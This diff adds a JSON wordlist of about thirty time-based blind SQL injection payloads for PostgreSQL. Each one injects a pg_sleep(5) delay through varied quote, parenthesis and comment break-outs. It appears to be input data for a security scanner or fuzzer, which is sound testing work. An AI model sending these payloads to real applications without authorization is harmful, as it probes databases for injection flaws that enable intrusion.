@@ -1,0 +1,126 @@
+[
+  {
+    "name": "postgresql",
+    "payload": "\";SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": ";SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": "and SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": "(SELECT pg_sleep(5))"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\" or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "' or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1) or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\") or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "') or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1)) or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\")) or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "')) or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)#"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)#"
+  },
+  {
+    "name": "postgresql",
+    "payload": "' SELECT pg_sleep(5);"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": ") or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": ")) or pg_sleep(5)--"
+  }
+]
